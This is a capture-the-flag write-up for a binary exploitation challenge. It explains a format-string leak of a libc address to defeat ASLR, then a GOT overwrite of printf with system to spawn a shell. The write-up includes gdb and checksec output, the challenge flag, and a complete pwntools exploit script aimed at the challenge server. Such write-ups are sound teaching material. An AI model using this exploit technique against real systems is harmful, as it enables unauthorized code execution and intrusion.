https://ctftime.org/event/2252/

# All (Pwn)

What if I just.... put ALL the vulnerabilities in there? With no mitigations?

nc all.chal.cyberjousting.com 1348

## Binary Analysis

`vuln` @ `0x00401199`:
- `read` of `0x100` into buffer on stack at `-0x28`
- `printf` of user controlled buffer

As the description alludes there are essentially no mitigations in the binary itself:

```
$ pwn checksec ./src/all
[*] '/home/user/ctf/pwn/all/src/all'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

It is likely that there are many other possible solutions to this challenge, that seems to been the intention of the author, so please consider this just one of many rather than the only way to do it.

## Solution

### Abitary Write With Format String

We will use the controlled buffer passed to `printf` to perform a `GOT` overwrite.

Specifically we will swap the entry for `printf` with the value address of `system`.

We will do this using `fmtstr_payload` from pwntools that takes:
- The index of the first argument which corresponds to the format string
- A map of locations to write and values to write to them

In order to determine the index we can simply invoke the binary as follows:

```
$ echo "%p.%p.%p.%p.%p.%p.%p" | nc all.chal.cyberjousting.com 1348
0x7ffe0c7bac00.0x100.0x7f01efbf17e2.0x7f01efcf8f10.0x7f01efd10040.0x70252e70252e7025.0x252e70252e70252e
^C
```

We can see that the 6th value corresponds to the hex representation of our format string:

```
$ echo -n "%p.%p.%p.%p.%p.%p.%p" | xxd -p
25702e25702e25702e25702e25702e25702e2570
```

### ASLR Bypass

In order write to the `GOT` entry for `printf` we need to know the ASLR base that `libc.so` is using.

From the earlier `printf` output we can see addresses that probably point to `libc.so` in the 3rd slot.

We can check this with a debugger:

```
$ gdb -q ./src/all
pwndbg> r
%p.%p.%p.%p.%p.%p.%p
0x7fffffffdb70.0x100.0x7ffff7d1a7a1.(nil).0x7ffff7fcb180.0x70252e70252e7025.0x252e70252e70252e
^C
pwndbg> xinfo 0x7ffff7d1a7a1
Extended information for virtual address 0x7ffff7d1a7a1:

  Containing mapping:
    0x7ffff7c26000     0x7ffff7da5000 r-xp   17f000  26000 /usr/lib/x86_64-linux-gnu/libc.so.6

  Offset information:
         Mapped Area 0x7ffff7d1a7a1 = 0x7ffff7c26000 + 0xf47a1
         File (Base) 0x7ffff7d1a7a1 = 0x7ffff7c00000 + 0x11a7a1
      File (Segment) 0x7ffff7d1a7a1 = 0x7ffff7c26000 + 0xf47a1
         File (Disk) 0x7ffff7d1a7a1 = /usr/lib/x86_64-linux-gnu/libc.so.6 + 0x11a7a1

 Containing ELF sections:
               .text 0x7ffff7d1a7a1 = 0x7ffff7c267c0 + 0xf3fe
```

In order to compute the `libc.so` base:
- Leak the specific value we are interested in with `%3$p`.
- Subtract the base of `libc.so` from the leak:
    - `0x7ffff7d1a7a1 - 0x7ffff7c00000 = 0x11a7a1`
- Figure out what `0x11a7a1` refers to by looking at `libc.so` in a disassembler:
    - `read+0x17` or `0x17` bytes after the `read` symbol.
    - Its also possible to do this in the debugger.
- Copy the version of `libc.so` that the remote uses from the provided Dockerfile:
    - `$ docker cp id:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so`
    - Which has the following SHA-2-256 hash:
        - `67d9e00d38d59674367ca4591666c67e5dfad9e4fdd3861a59d6f26ffea87f65`
- Figure out the offset from the image base that corresponds to same logical point in the remote's `libc.so`:
    - `read+0x17 = 0x1147e2`
- Now we are ready to leak the address of `read+0x17` from the remote and subtract `0x1147e2` in order to compute the base.
- In order to compute the address of `printf`'s entry in the `GOT` at the given ASLR base we'll use pwntools:
    - First set the base address of the image so it matches that of the remote:
        - `ELF("./libc.so").address = leak - 0x1147e2`
            - Where `"./libc.so"` is a local copy of the `libc.so` we copied from the running container.
    - Now you can read addresses from the `GOT` and they will match the remote exactly:
        - e.g. `elf.got["printf"]`

### Calling System

Now that calls to `printf`, via the modifed `GOT`, are actually calls to `system` we simply allow the code to loop once more supplying the string `/bin/sh\x00` to `read` such that it will be passed to `printf` and therefore acts like `system("/bin/sh\x00")`.

### Final Exploit

```
from pwn import *

elf = ELF("./src/all", checksec=False)
context.binary = elf
libc = ELF("./libc.so")

p = remote("all.chal.cyberjousting.com", 1348)

p.sendline(b"%3$p")

leak = int(p.readline().decode(), 16)
READ_PLUS_0x17 = 0x1147e2
libc.address = leak - READ_PLUS_0x17

payload = fmtstr_payload(6, {elf.got["printf"]: libc.sym["system"]})
p.sendline(payload)

p.sendline(b"/bin/sh")

p.clean()

p.interactive()
```

## Flag
`byuctf{too_many_options_what_do_I_chooooooose}`
